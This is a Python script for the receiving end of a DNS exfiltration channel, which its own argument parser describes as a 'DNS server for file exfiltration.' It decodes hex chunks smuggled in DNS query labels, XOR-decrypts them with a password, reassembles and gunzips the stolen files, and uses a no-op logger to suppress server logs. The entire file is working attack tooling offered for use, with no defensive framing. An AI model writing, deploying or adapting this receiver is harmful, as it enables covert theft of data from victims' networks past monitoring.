import argparse
from dnslib import DNSRecord, DNSHeader
from dnslib.server import DNSServer, BaseResolver
import binascii
import gzip
import sys
from datetime import datetime

def color(string, color=None):
    colors = {
        'red': '31',
        'green': '32',
        'blue': '34',
    }

    attr = ['1']  # bold

    if color:
        return f'\x1b[{attr[0]};{colors[color]}m{string}\x1b[0m'

    if string.strip().startswith('[!]'):
        return f'\x1b[{attr[0]};{colors["red"]}m{string}\x1b[0m'
    elif string.strip().startswith('[+]'):
        return f'\x1b[{attr[0]};{colors["green"]}m{string}\x1b[0m'
    elif string.strip().startswith('[?]'):
        return f'\x1b[{attr[0]};{colors["blue"]}m{string}\x1b[0m'
    elif string.strip().startswith('[*]'):
        return f'\x1b[{attr[0]}m{string}\x1b[0m'
    else:
        return string

def print_progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=60, fill='█'):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)
    sys.stdout.write(f'\r{prefix} |{bar}| {percent}% {suffix}', )
    sys.stdout.flush()
    if iteration == total:
        sys.stdout.write('\n')
        sys.stdout.flush()

class DataResolver(BaseResolver):
    def __init__(self, password):
        self.data_store = {}  # Dictionary to store data chunks by filename
        self.password = password.encode()

    def xor_decrypt(self, data, password):
        # Create an array to store the decrypted bytes
        decrypted_data = bytearray()

        # Decrypt each byte
        for i in range(len(data)):
            decrypted_byte = data[i] ^ password[i % len(password)]
            decrypted_data.append(decrypted_byte)

        return decrypted_data

    def resolve(self, request, handler):
        qname = request.q.qname
        labels = str(qname).split('.')

        # Simulate an NXDOMAIN response
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

        # Extract metadata and filename from the second last label
        try:
            metadata = labels[5]
            filename_hex, timestamp, number_of_chunks = metadata.split('|')
            filename_enc = bytearray.fromhex(filename_hex)
            filename = self.xor_decrypt(filename_enc, self.password).decode()
        except:
            #print(color(f"\n[?] Query with unknown format received!"))
            return reply

        # Prepare the file key
        file_key = f"{timestamp}_{filename}"

        if file_key not in self.data_store:
            self.data_store[file_key] = [None] * int(number_of_chunks)  # Pre-allocate list for all chunks
            print(color(f"\n[*] Reception of new file {file_key} has started!"))

        # Extract chunk ID and hex-encoded chunks
        chunk_id = int(labels[0])
        hex_chunks = labels[1:5]
        hex_data = ''.join(hex_chunks)
        self.data_store[file_key][chunk_id] = hex_data

        print_progress_bar(chunk_id + 1, int(number_of_chunks), prefix=f'Receiving file {file_key}:', suffix='Complete', length=50)
        if chunk_id == int(number_of_chunks) - 1:
            chunks = self.data_store[file_key]
            print(color(f"\n[+] Transfer of {file_key} complete!"))
            if None in chunks:
                print(color(f"\n[!] Missing chunks for {file_key}, file will not be written."))
            else:
                try:
                    encrypted_data = bytearray.fromhex(''.join(chunks))
                    decrypted_data = self.xor_decrypt(encrypted_data, self.password)
                    # Check if the file is gzipped by checking the first two bytes (gzip magic number)
                    if decrypted_data[:2] == b'\x1f\x8b':
                        output_file = file_key + ".gz"
                        with open(output_file, 'wb') as f:
                            f.write(decrypted_data)
                        with gzip.open(output_file, 'rb') as gz_file:
                            decompressed_data = gz_file.read()
                        decompressed_output_file = output_file[:-3]  # Remove .gz extension
                        with open(decompressed_output_file, 'wb') as f:
                            f.write(decompressed_data)
                        print(color(f"\n[+] Data written to {file_key}"))

                except:
                    print(color(f"\n[!] Failed to decode or write data of {file_key}"))

        return reply

class NoOpLogger:
    def log_pass(self, *args, **kwargs):
        pass

    log_recv = log_send = log_request = log_reply = log_truncated = log_error = log_data = log_pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS server for file exfiltration.")
    parser.add_argument("dns_server_ip", help="IP address of the DNS server")
    parser.add_argument("password", help="Password for XOR encryption/decryption")
    parser.add_argument("--usetcp", action="store_true", help="Use TCP instead of UDP")
    
    args = parser.parse_args()
    
    dns_server_ip = args.dns_server_ip
    password = args.password
    use_tcp = args.usetcp

    logger = NoOpLogger()  # Use the no-op logger to suppress output
    resolver = DataResolver(password)
    server = DNSServer(resolver, port=53, address=dns_server_ip, logger=logger, tcp=use_tcp)
    
    try:
        server.start_thread()
        print(color("[+] DNS server started. Press Ctrl+C to stop.\n"))
        while True:
            pass
    except KeyboardInterrupt:
        print(color("\n[!] Stopping server..."))
        server.stop()